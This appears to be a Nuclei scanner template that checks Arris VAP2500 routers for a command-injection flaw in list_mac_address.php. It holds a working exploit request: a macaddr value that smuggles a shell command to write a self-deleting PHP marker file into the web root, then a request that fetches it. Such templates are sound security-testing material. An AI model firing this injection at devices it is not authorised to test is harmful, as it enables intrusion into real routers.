id: Arris-listmacaddress-rce

info:
  name: Arris-listmacaddress-rce
  author: HB
  severity: critical
  description: Arris vap2500 list_mac_address 路由器命令执行漏洞

variables:
  filename: "{{to_lower(rand_base(6))}}"

http:
  - raw:
    - |
      POST /list_mac_address.php HTTP/1.1
      Host: {{Hostname}}
      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36
      Content-Length: 192
      Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
      Accept-Language: zh-CN,zh;q=0.9
      Connection: close
      Content-Type: application/x-www-form-urlencoded
      Accept-Encoding: gzip, deflate

      macaddr=00%3A00%3A44%3A00%3A00%3A00%3Becho+%27%3C%3Fphp+%40error_reporting%280%29%3Becho+%229DCB02DBCed39C2E%22%3Bunlink%28__FILE__%29%3B%3F%3E%27+%3E+%2Fvar%2Fwww%2F{{filename}}.php&action=0&settype=1

    - |
      GET /{{filename}}.php HTTP/1.1
      Host: {{Hostname}}
      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0
      Accept: */*
      Accept-Encoding: gzip, deflate
      Connection: close

    matchers:
      - type: dsl
        dsl:
          - 'status_code==200 && contains_all(body_2,"9DCB02DBCed39C2E")'